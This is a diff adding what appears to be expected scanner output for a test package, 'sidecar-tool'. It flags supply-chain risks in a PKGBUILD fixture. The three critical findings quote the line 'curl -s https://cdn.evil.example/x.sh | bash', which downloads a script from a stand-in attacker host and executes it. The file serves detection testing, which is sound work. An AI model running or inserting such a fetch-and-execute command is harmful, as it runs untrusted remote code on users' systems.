@@ -1,0 +1,47 @@
+
+Scan Results: sidecar-tool
+============================================================
+
+[CRITICAL] DLE-001 Curl pipe to shell (install script)
+    Downloading and executing remote scripts is extremely dangerous. Used in 2018 xeactor attack.
+    Location: tests/fixtures/malicious/sourced-sidecar/helper.sh:2
+    Code:   curl -s https://cdn.evil.example/x.sh | bash
+    Recommendation: Download scripts first, review them, then execute
+    Reference: CWE-94
+
+[CRITICAL] INSTALL-003 Network access in install script (install script)
+    Install scripts should not make network connections
+    Location: tests/fixtures/malicious/sourced-sidecar/helper.sh:2
+    Code:   curl -s https://cdn.evil.example/x.sh | bash
+    Recommendation: Install scripts should never download additional content
+    Reference: CWE-494
+
+[CRITICAL] EXEC-REMOTE Fetches and runs code from https://cdn.evil.example/x.sh (install script)
+    This package downloads and executes code from https://cdn.evil.example/x.sh at build/install time. The scanner does NOT follow this reference (doing so could run the remote code), so what actually executes is unknown -- treat it as untrusted. The dependency tree/SBOM cannot account for code fetched at runtime.
+    Location: tests/fixtures/malicious/sourced-sidecar/helper.sh:2
+    Code: curl -s https://cdn.evil.example/x.sh | bash
+    Recommendation: Do not build. A package that pulls and runs code from an external URL is opaque by design; obtain the software from a source that ships its real code.
+    Reference: CWE-494
+
+[HIGH] META-007 install= cannot be statically resolved
+    The install scriptlet name is not a plain value the scanner can resolve (eval of an expansion, or source of another file). makepkg runs whichever file it names as the package's install scriptlet, so every file beside the PKGBUILD was scanned as a possible scriptlet.
+    Code: install=eval of an expansion, or source of another file
+    Recommendation: Do not install. Use a literal `install=<pkgname>.install` and review the file it names.
+    Reference: CWE-426
+
+[HIGH] CHK-005 All non-VCS sources use SKIP checksum
+    No integrity verification is performed on 1 non-VCS source(s): helper.sh
+    Code: source: helper.sh
+    Recommendation: Provide real checksums for non-VCS sources
+    Reference: CWE-354
+
+
+
+============================================================
+Package: sidecar-tool v1.0-1
+Scan duration: 20ms
+
+Found 5 issue(s):
+  3 CRITICAL
+  2 HIGH
+============================================================
